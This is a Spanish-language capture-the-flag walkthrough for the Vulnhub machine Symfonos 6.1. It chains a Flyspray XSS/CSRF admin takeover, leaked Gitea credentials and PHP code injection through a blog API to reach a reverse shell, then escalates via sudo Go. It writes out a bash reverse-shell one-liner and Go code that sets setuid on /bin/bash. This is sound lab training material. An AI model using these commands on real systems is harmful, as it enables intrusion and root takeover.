## Información General

- **Nombre de la máquina**: Symfonos 6.1
- **Fecha de realización**: [[2024-04-02]]
- **Nivel de dificultad**: Medio
- **Sistema Operativo**: Linux
- **Plataforma**: Vulnhub
- **Enlace de la máquina**: [Enlace a la plataforma donde se encuentra la máquina]

## Resumen
[Un breve resumen de la máquina y las técnicas utilizadas para comprometerla.]

## Enumeración y Reconocimiento

Empezamos enumerando los puertos de la maquina 


![[Pasted image 20240407075253.png]]


Como se puede observar, hay varios puertos abiertos, algunos correspondientes a diferentes servicios como SSH, HTTP y MySQL. Hay dos puertos adicionales que aún no hemos identificado. Comenzaremos analizando el puerto 80. Al intentar acceder a través del navegador, solo vemos una imagen, pero no encontramos nada de interés.

![[Pasted image 20240407075359.png]]

Pero eso cambia cuando enumeramos los directorios con wfuzz, podemos observar que hay dos directorios bastante interesantes.


![[Pasted image 20240407081744.png]]

En el primer sitio podemos ver solo un post que probablmente sea una pista 


![[Pasted image 20240407081815.png]]


Y en el segundo sitio vemos algo aún más interesante, en el cual aparentemente es donde se reportan los errores de código.


![[Pasted image 20240407081903.png]]

  
Investigando un poco el sitio, podemos observar que hay una sección dedicada a reportar bugs, donde encontramos un comentario de un administrador que menciona revisar regularmente esta página. Esto nos hace conscientes de un posible vector de ataque.


![[Pasted image 20240407082340.png]]


Al buscar en Searchsploit por Flyspray, observamos que existen varios exploits para varias versiones. Lamentablemente, no pude encontrar la versión específica del sitio web, pero seleccioné el exploit que abarca más versiones.


![[Pasted image 20240405144549.png]]

Analizando el exploit podemos ver que este consiste en un csrf que crea un nuevo admin esta vulnerabilidad  se ejecuta  gracias a un xss en el campo de real name 

![[Pasted image 20240405162059.png]]



Así que ahora lo que tendremos que encontrar es el campo 'real name'. Buscando en todo el sitio, llegué al apartado de registro y como podemos observar, hay un campo llamado 'real name'. En este campo no vamos a poner ningún payload; primero tendremos que crear la cuenta con cualquier otro nombre, como se muestra a continuación:

![[Pasted image 20240411184813.png]]

Ahora accedemos a la cuenta que creamos anteriormente. Dado que el usuario administrador revisa periódicamente la página de informe de errores, podemos realizar un comentario estratégico que luego aprovecharemos para aplicar el XSS.


![[Pasted image 20240411184859.png]]




Ahora, lo que hice fue entrar en mi perfil y editar el 'real name'. En este, coloqué un payload para realizar XSS, basado en el payload del PoC que se encuentra en el exploit. Este payload permite acceder al servidor HTTP de la máquina atacante y ejecutar el exploit. Después, procedí a levantar el servidor y editar el nombre de la siguiente manera:




![[Pasted image 20240405183638.png]]


![[Pasted image 20240411203906.png]]

Guardamos los cambios. Como el usuario administrador verifica de forma recurrente la página donde se reportan los bugs, y ya que nuestro nombre contiene un XSS, lo que sucederá es que el administrador verá el comentario y enseguida se ejecutará el código JavaScript. Este código dirigirá al administrador a nuestro exploit y lo ejecutará, lo que resultará en la creación de un nuevo administrador con las credenciales especificadas en el exploit. Entonces, si esperamos un poco, podemos ver que alguien desde la máquina víctima accedió al exploit. Por lo tanto, podemos suponer que fue el administrador y que ha creado la cuenta.


![[Pasted image 20240411223236.png]]


  
Si ingresamos ahora con las credenciales especificadas en el exploit, podemos ver que nos permite el acceso. Además, también podemos observar otro informe de errores.


![[Pasted image 20240411223407.png]]


Al entrar al nuevo reporte de errores podemos ver que en este se encuentra un mensaje donde alguien anuncia que ha configurado Gitea para gestionar las necesidades de git de manera interna en su organización. Además, proporcionan credenciales (nombre de usuario y contraseña) para acceder al proyecto en Gitea.


![[Pasted image 20240416084726.png]]

Lo que hice fue revisar nuevamente la enumeración para verificar si en alguno de los puertos encontrados estaba ejecutándose Gitea, y así fue: estaba corriendo en el puerto 3000.

![[Pasted image 20240416085417.png]]


Había un login, así que ingresé las credenciales que encontré y estas fueron aceptadas.


![[Pasted image 20240416085605.png]]


![[Pasted image 20240416090544.png]]

Investigando un poco vemos que el usuario achilles tiene dos repositorios uno que parece del blog que fue el que anteiormente encontramos y otro de una api


![[Pasted image 20240416090906.png]]

Entré al repositorio del blog y me puse a indagar, encontrando la función `preg_replace()`. La parte interesante aquí es el modificador `/e` que se utiliza al final de la expresión regular. En versiones antiguas de PHP, este modificador permitía que el segundo argumento de `preg_replace()` fuera evaluado como código PHP. Esto significa que, en lugar de reemplazar el texto encontrado por un string estático, se ejecutaría como si fuera código PHP y el resultado de esa ejecución se utilizaría como reemplazo.




![[Pasted image 20240416101607.png]]


Así que tenemos que encontrar una forma de inyectar contenido en la página de los posts. Por lo tanto, me puse a revisar el repositorio de la API y me di cuenta de que está corriendo en el puerto 5000, el cual también nos fue reportado al momento de hacer la enumeración de puertos con nmap.

![[Pasted image 20240416103617.png]]

Al acceder al puerto, observamos que solo nos devuelve un código de estado 404.


![[Pasted image 20240416103954.png]]


Por lo tanto, decidí explorar los demás archivos del repositorio y encontré uno que parece estar definiendo un conjunto de rutas para una API web utilizando el framework Gin en Go. En este archivo, las rutas están agrupadas bajo "/ls2o4g"

![[Pasted image 20240416123010.png]]


  
Dentro de una carpeta se encontraba un archivo que definía una ruta que estaba dentro de otra ruta. Esta última contenía varias rutas, incluyendo una para el ping, otra para la autenticación y una más para los posts.


![[Pasted image 20240416124310.png]]

Dentro de esa carpeta, había otras dos carpetas. La primera contenía dos archivos. El primero contiene código que configura las rutas relacionadas con la autenticación en una aplicación web utilizando el framework Gin. Probablemente solo vayamos a utilizar la ruta de login.


![[Pasted image 20240416132833.png]]

  
El segundo archivo define funcionalidades básicas para la autenticación de usuarios. Además, nos muestra que para autenticarnos, debemos enviar dos datos: el nombre de usuario y la contraseña. Como vimos en el archivo anterior, estos datos deben ser enviados a través del método POST. Si la autenticación es exitosa, se generará un token.


![[Pasted image 20240416134659.png]]


  
En la segunda carpeta había tres archivos. El primero es un código que configura rutas para manejar operaciones CRUD (Crear, Leer, Actualizar, Eliminar) desde la ruta posts.

![[Pasted image 20240416153110.png]]

El segundo archivo contiene funciones para llevar a cabo operaciones CRUD (Crear, Leer, Actualizar, Eliminar) en los posts de un blog. Incluye funciones para crear nuevos posts, listarlas con paginación, leer un post específica mediante su ID, eliminar un post por su ID (verificando la propiedad del usuario) y actualizar un post existente por su ID (también verificando la propiedad del usuario).


![[Pasted image 20240416155942.png]]

  
El tercer archivo no era relevante; simplemente era un archivo .swp.

![[Pasted image 20240416160158.png]]



  
  
Entonces, una vez que conocemos la función de cada archivo y sus posibles vectores de ataque, lo que debemos hacer es autenticarnos. Después, procedemos a listar todos los posts para así identificar el ID correspondiente al post que deseamos modificar. Luego, lo actualizamos e inyectamos código PHP para lograr una reverse shell. Por lo tanto, el primer paso es autenticarnos con las credenciales previamente obtenidas, enviándolas por método POST a la ruta de inicio de sesión. Podemos hacerlo utilizando `curl` de la siguiente manera:


![[Pasted image 20240416165041.png]]

Al ejecutar este comando, podemos ver que nos devuelve un token. Lo utilizaremos más adelante.


![[Pasted image 20240416165343.png]]


  
Ahora lo que tendremos que hacer es averiguar cuál es el ID del post que está publicado en la página. Para esto, de igual manera, podemos usar `curl`. Simplemente realizamos una petición GET a la ruta de la API de posts de la siguiente manera:

![[Pasted image 20240416202854.png]]


Si ejecutamos el comando, nos responderá con un listado de todos los posts que están en la página. En este caso, podemos ver que solo existe un post, el cual tiene como id el numero uno.


![[Pasted image 20240416203306.png]]


Sabiendo esto, ahora solo faltaría modificar el post para colocar un código PHP que ejecute comandos. En este caso, vamos a hacer una reverse shell, pero primero tenemos que crear un archivo .sh con el siguiente código. En este archivo, indicaremos la dirección IP de la máquina atacante y el puerto donde estaremos escuchando.


```bash
bash -i >& /dev/tcp/ip/puerto 0>&1
```

  
Luego, desde el directorio donde hemos creado el script, levantamos un servidor con la ayuda de Python.


![[Pasted image 20240416211152.png]]



Finalmente, con Netcat abrimos el puerto especificado en el script, donde estaremos escuchando.


![[Pasted image 20240416211018.png]]

Entonces, ahora podemos hacer la consulta a la ruta de posts indicando la ID del post a modificar, utilizando el método PATCH. También debemos incluir el token generado anteriormente como cookie y enviar como datos la función `system` junto con el comando a ejecutar. En este caso,  vamos a descargar en la máquina víctima el script de Bash y despues ejecutarlo. Todo esto podemos hacerlo utilizando `curl` de la siguiente manera:


![[Pasted image 20240416212557.png]]

Entonces, si lo ejecutamos, podemos observar que se establece una conexión a nuestro Netcat, lo que resulta en una reverse shell.

![[Pasted image 20240416215220.png]]


Enumerando el sistema podemos ver que existe el usuario achilles


![[Pasted image 20240416220054.png]]

  
Así que, al probar cosas, vemos que la contraseña encontrada anteriormente es la misma para acceder a este usuario. Por lo tanto, ahora somos el usuario Achilles.

![[Pasted image 20240416220432.png]]

Enumerando al usuario actual vemos que este tiene permiso para ejecutar el comando `/usr/local/go/bin/go` con privilegios de superusuario sin necesidad de ingresar una contraseña.

![[Pasted image 20240416220715.png]]


Sabiendo esto, lo que podemos hacer es crear un script que aproveche el hecho de que Go se está ejecutando como root para asignar permisos setuid a la shell bash. El script quedaría de la siguiente manera:


```go
package main

import (
    "fmt"
    "os/exec"
)

func main() {
    // Asigna permisos setuid a la shell bash
    cmd := exec.Command("chmod", "u+s", "/bin/bash")
    
    // Ejecuta el comando y maneja cualquier error
    if err := cmd.Run(); err != nil {
        fmt.Println("Error al ejecutar el comando:", err)
        return
    }
    
    fmt.Println("Permisos setuid asignados correctamente a /bin/bash")
}

```

Si los compilamos y ejecutamos, podemos ver que se han asignado correctamente los permisos setuid a la bash. Ahora, si ejecutamos una bash con la bandera `-p`, veremos que ahora somos el usuario root. Hemos escalado privilegios correctamente.


![[Pasted image 20240416223325.png]]


"Ahora solo nos dirigimos a la carpeta personal de root y nos da un mensaje de felicitación.


![[Pasted image 20240416223530.png]]